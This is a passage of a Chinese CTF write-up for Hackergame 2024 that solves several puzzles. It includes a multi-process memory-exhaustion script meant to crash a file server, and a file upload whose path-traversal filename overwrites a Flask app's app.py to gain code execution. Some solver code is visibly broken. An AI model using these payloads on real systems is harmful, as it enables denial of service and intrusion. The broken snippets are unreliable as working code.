                                              NULL,
                                              NULL);

    if (r) {
        gchar *f;
        g_variant_get(r, "(&s)", &f);
        g_print("%s", f);
        g_variant_unref(r);
    }
    g_object_unref(c);
    return 0;
}
```

## 动画分享

> 为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、**几年前编译的某~~祖传~~ 终端模拟器** 里面跑起了自己的 `fileserver`，然后就去锁屏吃饭了。
>
> 小 T：「诶，我不过就分享个文件，而且目录里面也没别的东西，所以没关系吧～而且我特地搞了个 chroot，就算我真写出了什么漏洞，你也休想看到我的 flag！」
>
> 请提交一个程序，题目环境会在模拟小 T 的环境运行之后，降权运行你的程序：
>
> * 如果你能让小 T 的 `fileserver` 无法正常响应请求（例如让 `fileserver` 退出），你可以获得第一小题的 flag。
> * 第二小题的 flag 在 `/flag2`，你需要想办法得到这个文件的内容。
>   环境限制总 PID 数为 64。

尝试占用内存得到第一小题的flag

```Python
#!/usr/bin/env python3
from multiprocessing import Process
def s():
    x = []
    while True: x.append(" " * 10**8)
for _ in range(64):
    Process(target=s).start()
```

## 关灯
> 3D 版本的关灯游戏。
> 
> 注：解决这道题不需要很多计算资源，一般的笔记本电脑都是可以完成任务的。最后一问传输数据量较大而且时限很短，为了避免网速的影响，使用了多阶段的题目下载与答案上传机制。

前三问和二维关灯游戏类似先写出邻接矩阵然后$GF(2)$用高斯消元法求解方程即可。
```Python
def solve(sz, b_str):
    b = np.array(list(map(int, b_str)), dtype=int)
    ms = sz * 3
    S = np.zeros((ms, ms), dtype=int)

    for n in range(ms):
        x, y, z = n // (sz  2), (n // sz) % sz, n % sz
        S[n, n] = 1
        for dx, dy, dz in [(1, 0, 0), (-1, 0, 0), (0, 1, 0), (0, -1, 0), (0, 0, 1), (0, 0, -1)]:
            nx, ny, nz = x + dx, y + dy, z + dz
            if 0 <= nx < sz and 0 <= ny < sz and 0 <= nz < sz:
                ni = nx * sz ** 2 + ny * sz + nz
                S[n, ni] = 1

    for i in range(ms):
        if S[i, i] == 0:
            for j in range(i + 1, ms):
                if S[j, i]:
                    S[[i, j]], b[i], b[j] = S[[j, i]], b[j], b[i]
                    break
        for j in range(i + 1, ms):
            if S[j, i]:
                S[j] ^= S[i]
                b[j] ^= b[i]

    x = np.zeros(ms, dtype=int)
    for i in range(ms - 1, -1, -1):
        if S[i, i] == 0 and b[i] != 0:
            raise ValueError("No solution exists")
        x[i] = b[i]
        for j in range(i + 1, ms):
            x[i] ^= S[i, j] * x[j]

    return ''.join(map(str, x *)
```
## 禁止内卷

> （以下剧情均为虚构，请助教和学生都不要模仿！）
>
> XXX 课程实验一内容：
>
>> 本实验需要使用给定的用户评论预测用户对书籍、电影和动画的评分。
>>
>> …………（部分省略）
>>
>> 我们提供来自诸如某瓣、某某艺、某字母站、某某米等网站的一部分用户评论和评分数据作为训练集，你需要使用这些数据训练模型，来预测对于另一部分给定的评论（测试集），用户会打出怎样的给分。测试集只提供评论数据，不提供评分。用户评分均归一化到 0 到 100 分的整数。
>>
>> 对于我们给定的 50000 项的测试集，本实验要求提交对这些测试集你的模型的输出结果，以 JSON 列表的格式输出，列表中每一项是一个 0 到 100 的整数。
>>
>> 特别地，为了鼓励同学们互相 PK，我们特别开设了评分网站，提供前 500 项的数据测试。诸位可以在做实验的时候提交自己的结果，直接看到自己距离预期分数的平方差，更有榜单功能。
>>
>> 实验 DDL：…………（部分省略）
>>
>
> 但是这周的实验和作业实在是太多了，太多了，太多了。而且和你同班的有至少 114 个卷王。你刷新着榜单网站，看到榜一越来越小的平方差，陷入了绝望。
>
> 不过你的舍友好像之前说他帮这门课助教写了个啥东西（没有加分），好像就是这个网站。你私聊问他要到了源代码，白盒审计的时候发现了不得了的事情……你发现，你不仅可以拿到答案，而且可以搞点破坏，让各位卷王不要再卷了！
>
> 本题的 flag 位于评分数据原始 JSON 文件的列表头部，将对应的数字加 65 后使用 ASCII 编码转换后即为 flag 文本。
>
> 这是你从舍友那里获取到的网站主要代码文件：
>
> 提示：助教部署的时候偷懒了，直接用了 flask run（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 --reload。启动的完整命令为 flask run --reload --host 0。网站代码运行在 /tmp/web。

注意到这里启用了自动重载，于是我们可以直接把`app.py`换掉（）

```Python
requests.post(url, files={'file': (r'"../../tmp/web/app.py"', f)}, cookies=cookies, headers=headers)
```

就得到了flag！

## 哈希三碰撞

> 「太奇怪了！」小 Z 盯着显示器愁眉不展。
> 
> 作为一名密码学家，小 Z 一直为自己能轻松找出哈希碰撞而自豪。毕竟在密码学的江湖中，找到两个不同的字符串却产生相同的哈希值，这种本事可不是人人都有的。
> 
> 但今天，小 Z 遇到了一个前所未有的挑战。
> 
> 「找到两个碰撞就像找到双胞胎，」小 Z 自言自语，「可是现在，我需要找到三胞胎？！」
> 
> 是的，在这个平行宇宙中，仅仅找到两个碰撞已经不够刺激了。作为一名合格的哈希碰撞猎人，你必须找到三个不同的字符串，它们在经过哈希计算后会产生相同的值。
> 
> 「双胞胎在自然界尚且常见，三胞胎可就是凤毛麟角了。」小 Z 叹了口气。
> 
> 你能帮助小 Z 找到这个传说中的三碰撞吗？
> 
> 「在密码学的世界里，两个是巧合，三个才是艺术。」
 
flag1经过逆向后发现只判断了最后4字节的输入。简单暴力即可。

## 零知识数独

> 一款全新的零知识数独！你已然是数独高手，也终将成为零知识证明大师！
>
> > "If the proof is correct, then no other recognition is needed."
>> — by Grigori Perelman
>>
>
> ZK 验证逻辑
> 本题的附件中给出了零知识数独电路，以及对应的 Groth16 验证密钥，服务端会使用它保存的谜题（Public Signals）和验证密钥（Verification Key）来验证提交的 Groth16 证明 proof.json。你的证明在本地需要满足：
>
```Bash
> $ snarkjs groth16 verify verification_key.json public.json proof.json
> [INFO]  snarkJS: OK!
```

数独可以手算也可以写程序实现。得到flag1

flag2需要在本地实现零知识证明。先创建一个`input.json`存储已完成和未完成的数独
```JSON
{
    "unsolved_grid": [
        [5, 3, 0, 0, 7, 0, 0, 0, 0],
        [6, 0, 0, 1, 9, 5, 0, 0, 0],
        [0, 9, 8, 0, 0, 0, 0, 6, 0],
        [8, 0, 0, 0, 6, 0, 0, 0, 3],
        [4, 0, 0, 8, 0, 3, 0, 0, 1],
        [7, 0, 0, 0, 2, 0, 0, 0, 6],
        [0, 6, 0, 0, 0, 0, 2, 8, 0],
        [0, 0, 0, 4, 1, 9, 0, 0, 5],
        [0, 0, 0, 0, 8, 0, 0, 7, 9]
    ],
    "solved_grid": [
        [5, 3, 4, 6, 7, 8, 9, 1, 2],
        [6, 7, 2, 1, 9, 5, 3, 4, 8],
        [1, 9, 8, 3, 4, 2, 5, 6, 7],
        [8, 5, 9, 7, 6, 1, 4, 2, 3],
        [4, 2, 6, 8, 5, 3, 7, 9, 1],
        [7, 1, 3, 9, 2, 4, 8, 5, 6],
        [9, 6, 1, 5, 3, 7, 2, 8, 4],
        [2, 8, 7, 4, 1, 9, 6, 3, 5],
        [3, 4, 5, 2, 8, 6, 1, 7, 9]
    ]
}
```
然后生成witness文件
```Bash
snarkjs wtns calculate sudoku.wasm input.json output.wtns
```
生成证明文件
```Bash
snarkjs groth16 prove sudoku_final.zkey witness.wtns proof.json public.json
```
上传`proof.json`即可

第三个flag猜测是利用电路中的漏洞生成解。`gt_zero_signals[i][j] <-- (solved_grid[i][j] > 0);`看样子似乎是个突破点毕竟没生成有效的约束但还是没做出来....（笨死）

## 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」

> > 以下内容包含 Human 辅助创作
>
> emmmmm 这次事件的背景大概如题所示。具体而言，在某位不幸群友转生成了 [Qwen 2.5-3B](https://modelscope.cn/models/qwen/Qwen2.5-3B-Instruct-GGUF)（还是 8-bit 量化的）后，毫无人道主义关怀的出题人们使用各种超越碳基生物（以及硅基生物）想象力的提示词对其进行了花样繁多的调戏。为了表达自己的不满，这位可怜的 LLM 只好锲而不舍地输出一些关于 Hackergame 的胡话。幸好 Hackergame 内容审查委员会提前部署了分级的内容审查系统（详见题目附件），比如把和 `hackergame` 相关的字符全部屏蔽成 `'x'` 了：
> 
> 
> In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.
> 
> 
> 嘛说实话这个审查系统似乎确凿是强了些（虽然它没审查题目标题），所以如果你一定想阅读原文的话估计得自己想办法了。

手动补全文章后根据`build.sh`里面的`echo "flag{llm_lm_lm_koshitantan_$(sha512sum before.txt | cut -d ' ' -f1 | cut -c1-16)}"`得到flag。（补全文章可以用Wordle相关的辅助工具）
